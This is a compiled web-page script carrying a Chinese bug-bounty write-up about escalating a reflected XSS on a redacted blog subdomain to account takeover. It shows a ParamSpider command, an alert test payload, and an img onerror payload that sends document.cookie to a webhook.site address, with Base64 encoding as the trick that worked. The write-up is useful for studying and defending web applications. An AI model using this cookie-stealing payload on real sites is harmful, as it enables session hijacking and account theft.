import{_ as s,o as a,c as t,ag as e}from"./chunks/framework.BLeoozAw.js";const p="/Awesome-SRC-experience/img/1_RoZet6wDPJj_WVBnv9x3iQ.png",n="/Awesome-SRC-experience/img/1_Y2y1BGAfk8SIIUha_AuRMQ.png",E=JSON.parse('{"title":"URL注入：通过跨站脚本 (XSS) 发现账户劫持 (ATO) 漏洞","description":"Awesome SRC Experience - URL注入：通过跨站脚本 (XSS) 发现账户劫持 (ATO) 漏洞","frontmatter":{"title":"URL注入：通过跨站脚本 (XSS) 发现账户劫持 (ATO) 漏洞","description":"Awesome SRC Experience - URL注入：通过跨站脚本 (XSS) 发现账户劫持 (ATO) 漏洞"},"headers":[],"relativePath":"experience/URL注入/url-injection.md","filePath":"experience/URL注入/url-injection.md"}'),l={name:"experience/URL注入/url-injection.md"};function h(k,i,r,d,o,c){return a(),t("div",null,[...i[0]||(i[0]=[e('<h1 id="url注入-通过跨站脚本-xss-发现账户劫持-ato-漏洞" tabindex="-1">URL注入：通过跨站脚本 (XSS) 发现账户劫持 (ATO) 漏洞 <a class="header-anchor" href="#url注入-通过跨站脚本-xss-发现账户劫持-ato-漏洞" aria-label="Permalink to &quot;URL注入：通过跨站脚本 (XSS) 发现账户劫持 (ATO) 漏洞&quot;">​</a></h1><p>在寻找一个拥有数百万用户的程序时，我特别关注了一个大型博客网站，这里姑且称之为 <code>redacted.com</code>。我首先对其子域名进行了枚举。我发现的一个子域名是 <code>jp.redacted.com</code>。</p><p>接下来，我使用 <code>Param Spider</code> 工具来收集所有可能的参数。我使用的命令是：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>param spider -d jp.redacted.com -s</span></span></code></pre></div><p>(该命令用于在终端列出所有可能的参数)</p><p>此命令在终端中列出了所有可能的参数。其中，我发现了一个名为 s= 的参数，它允许我使用简单载荷执行反射型 XSS (RXSS)：</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">alert</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><img src="'+p+'" alt=""></p><p>成功执行 XSS 后，我尝试使用简单载荷将其升级为 ATO （Account Takeover 即账户劫持）漏洞：</p><div class="language-HTML vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">HTML</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">img</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> src</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;x&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> onerror</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">location</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">%</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">27</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">https</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">//webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">%</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">27</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">cookie</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">;</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>然而，这种方法不起作用，我尝试了多种载荷都以失败告终。经过一番试验，我决定在输入载荷之前将其编码成 Base64 格式。令我惊讶的是，这样做的确让载荷在网站上执行，并成功捕获了受害者的 Cookie 信息。</p><p><img src="'+n+'" alt=""></p><p>我向该团队报告了通过 RXSS 漏洞导致的 ATO 漏洞，但遗憾的是，在过去的五个月里我都没有收到回复。</p><div class="tip custom-block"><p class="custom-block-title">🛠️ 使用的工具</p><p><strong>Param Spider：</strong> Param Spider 是一款强大的工具，专门用于从 <strong>Wayback Machine</strong> 等网络存档中挖掘有价值的 URL，以支持进一步的渗透测试工作，如漏洞挖掘、模糊测试等。</p></div>',14)])])}const y=s(l,[["render",h]]);export{E as __pageData,y as default};
